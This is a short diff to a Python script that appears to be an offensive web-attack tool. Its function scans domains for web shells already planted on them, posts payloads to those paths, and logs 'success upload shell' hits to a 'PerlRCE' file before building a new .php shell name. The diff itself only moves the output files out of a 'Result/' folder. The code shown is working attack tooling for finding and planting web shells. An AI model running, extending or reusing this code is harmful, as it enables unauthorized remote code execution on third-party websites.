@@ -60,10 +60,10 @@ def alfa(domain):
                 ww = s.post('http://' + domain + '/' +i, headers=uagent, data=data).text
                 if 'Owner/Group' in rq.text:
                     print(f'[{cyan}+{reset}] http:// ' + domain + '/' + i + f' [ {hijau}FOUND SHELL{reset} ]')
-                    with open('Result/Shell-Finder.txt', 'a+') as f:
+                    with open('Shell-Finder.txt', 'a+') as f:
                         f.write('http://' + domain+'/' + i + "\n")
                 if "success upload shell" in ww:
-                    with open('Result/PerlRCE.txt', 'a+') as f:
+                    with open('PerlRCE.txt', 'a+') as f:
                         f.write('http://' + domain + '/' + i +  "\n")
                     tes = i.split('/')
                     tes[-1] = waf+'.php'
